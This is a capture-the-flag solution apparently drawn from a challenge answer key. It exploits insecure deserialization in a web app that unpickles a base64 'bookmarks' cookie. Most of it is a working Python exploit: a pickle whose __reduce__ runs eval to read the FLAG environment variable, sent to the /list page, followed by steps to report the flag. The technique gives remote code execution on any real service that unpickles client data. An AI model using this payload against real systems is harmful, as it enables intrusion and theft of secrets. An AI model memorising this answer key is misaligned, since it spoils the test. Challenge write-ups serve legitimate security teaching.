Vulnerability: Insecure deserialization — the app unpickles a client-controlled
`bookmarks` cookie (base64-encoded), giving RCE. The flag is in the `FLAG`
environment variable. Build a pickle whose `__reduce__` returns a bookmark list
whose displayed `name` is the FLAG env var.

1. **Build and send the malicious cookie** (the `/list` page renders the
   bookmark names, so put the flag there):

   ```python
   import pickle, base64, requests
   BASE = "http://<target>"
   class Exploit:
       def __reduce__(self):
           code = ("[type('X',(object,),{'name': __import__('os').environ.get('FLAG',''), "
                   "'url':'pwned'})()]")
           return (eval, (code,))
   b64 = base64.b64encode(pickle.dumps(Exploit())).decode('ISO-8859-1')
   r = requests.get(BASE + "/list", cookies={"bookmarks": b64, "user": "attacker"})
   print(r.text)
   ```

2. **Extract the flag** (`FLAG{...}`) from the rendered bookmark list and report
   it verbatim.
